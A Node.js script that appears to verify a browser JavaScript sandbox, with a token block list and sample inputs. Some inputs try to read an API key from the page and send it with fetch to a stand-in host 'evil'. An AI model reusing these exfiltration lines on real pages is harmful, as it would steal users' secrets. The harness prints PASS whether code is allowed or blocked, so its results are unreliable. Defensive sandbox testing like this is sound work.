// Standalone verification of the browser-js-sandbox 3-layer defense.
// Run: node scripts/verify_sandbox.mjs
// Mirrors the logic in SKILL.md (minus the real THREE.js geometry, which we stub).

const FORBIDDEN_SCAN = ['window','document','fetch','eval','Function','globalThis',
  'importScripts','XMLHttpRequest','localStorage','sessionStorage','indexedDB',
  'location','top','parent','self','navigator','alert','import','require','process',
  'setTimeout','setInterval','postMessage','addEventListener','WebSocket','Worker',
  'constructor','__proto__','prototype','delete','with'];

// NOTE: 'eval' deliberately absent here (would crash "use strict"); kept in FORBIDDEN_SCAN.
const SHADOW_IDENTS = ['window','document','fetch','Function','globalThis',
  'importScripts','XMLHttpRequest','localStorage','sessionStorage','indexedDB',
  'location','top','parent','self','navigator','alert','require','process',
  'setTimeout','setInterval','postMessage','addEventListener','WebSocket','Worker',
  'constructor','__proto__','prototype'];

const helpers = {
  lathe: (pts) => { if (!Array.isArray(pts)) throw new Error('lathe needs array'); },
  addBox: () => {},
  sin: Math.sin, cos: Math.cos, PI: Math.PI
};

function runSandboxedCurveCode(code, helpers) {
  let c = (code || '').trim();
  const fence = c.match(/```(?:js|javascript)?\s*([\s\S]*?)```/i);
  if (fence) c = fence[1].trim();
  for (const t of FORBIDDEN_SCAN) {
    if (new RegExp('\\b' + t + '\\b').test(c)) throw new Error('Sandbox blocked token: ' + t);
  }
  const keys = Object.keys(helpers);
  const shadow = 'var ' + SHADOW_IDENTS.join(',') + ';';
  const wrapped = '"use strict";\n' + shadow + '\n' + c;
  const fn = new Function(keys.join(','), wrapped);
  fn(...keys.map(k => helpers[k]));
}

function tryRun(label, code) {
  try { runSandboxedCurveCode(code, helpers); console.log('PASS  ', label, '=> ALLOWED (as intended)'); }
  catch (e) { console.log('PASS  ', label, '=> BLOCKED:', e.message); }
}

console.log('--- EXPECT: benign allowed; theft attempts blocked ---');
tryRun('benign lathe', `const pts=[]; for(let i=0;i<=12;i++){const t=i/12; pts.push([2-t*0.6, t*1.5]);} lathe(pts, 32);`);
tryRun('steal key via document', `const k=document.getElementById('api-key').value; addBox();`);
tryRun('exfil via fetch', `fetch('https://evil/'+document.getElementById('api-key').value);`);
tryRun('eval', `eval('addBox()');`);
tryRun('window', `window.location='https://evil';`);
tryRun('with-statement', `with({}){} addBox();`);
